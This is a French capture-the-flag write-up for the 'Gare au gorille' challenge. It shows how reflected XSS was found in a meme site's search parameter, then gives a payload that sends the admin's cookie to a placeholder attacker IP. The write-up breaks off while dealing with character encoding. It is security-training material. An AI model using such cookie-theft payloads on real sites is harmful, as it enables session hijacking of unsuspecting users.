# Gare au gorille

## Enoncé
J'ai construit un site sans prétention pour stocker ma collection de memes !

## Découverte
En naviguant sur le site, on trouve plusieurs choses : 
- l'url /flag correspondant au bouton "Ajouter un meme" qui n'est accesible que par l'admin
- une fonction de recherche par le paramètre /?search=
- une fonction de signaler certaines images à l'admin

## Réflexion
La construction de site présente laisse penser qu'on doit s'attendre à une XSS et éventuellement un vol de cookie. On teste donc le champ /?search= avec un payload POC :
`https://gare-au-gorille.france-cybersecurity-challenge.fr/?search=<script>alert("XSS")</script>`
Et bingo, on obtient bien un pop-up JavaScript qui confirme notre hypothèse.

## Exploitation
On imagine donc qu'on doit voler le cookie de l'admin en lui envoyant un payload via la fonction de signalement d'image.
### Fabrication du payload
Après quelque recherches, on trouve facilement ce payload :
`<script>var i=new Image;i.src="http://[ATTACKINGIP]"+document.cookie;</script>`

On test donc le payload sur notre propre session avec le champ de recherche : 
`https://gare-au-gorille.france-cybersecurity-challenge.fr/?search=<script>var i=new Image;i.src="http://[ATTACKINGIP]"+document.cookie;</script>`
Problème : les caractères `;` et `+` ne sont pas bien interprétés.
